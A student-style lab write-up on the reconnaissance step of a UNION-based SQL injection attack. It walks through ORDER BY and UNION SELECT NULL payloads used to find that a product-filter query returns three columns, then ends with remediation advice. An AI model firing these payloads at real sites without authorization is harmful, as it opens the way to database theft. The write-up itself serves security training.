# Lab 07: SQL Injection - Determining the Number of Columns

## 🎯 Objective
The goal of this lab was to determine the number of columns returned by the original database query using a SQL injection UNION attack.

## 🔍 Vulnerability Description
Before an attacker can extract data using a UNION attack, they must first determine how many columns the original query returns. The UNION operator requires that both the original SELECT statement and the injected SELECT statement return the same number of columns. If the column counts do not match, the database throws an error.

## 💥 Exploitation Steps
1. Intercepted the product category filter request and sent it to Burp Suite Repeater.
2. Used the ORDER BY method to incrementally test the column count:
   - ' ORDER BY 1-- (200 OK)
   - ' ORDER BY 2-- (200 OK)
   - ' ORDER BY 3-- (200 OK)
   - ' ORDER BY 4-- (500 Internal Server Error)
3. The error at ORDER BY 4 confirmed that the query returns exactly 3 columns.
4. Verified the finding using UNION SELECT NULL:
   - ' UNION SELECT NULL-- (Error)
   - ' UNION SELECT NULL,NULL-- (Error)
   - ' UNION SELECT NULL,NULL,NULL-- (200 OK, page loads normally)

Payload used for final confirmation: ' UNION SELECT NULL,NULL,NULL--

Resulting Query: SELECT * FROM products WHERE category = '' UNION SELECT NULL,NULL,NULL--' AND released = 1

## ⚠️ Impact
Determining the column count is a critical first step in a UNION-based SQL injection attack. Once the attacker knows the number of columns, they can proceed to extract sensitive data from other tables, such as usernames and passwords.

## 🛡️ Remediation (Blue Team Perspective)
Use Parameterized Queries (Prepared Statements) to prevent user input from being interpreted as SQL code. Additionally, implement strict input validation and ensure that database error messages are not displayed to the user, which prevents attackers from confirming their column count guesses.
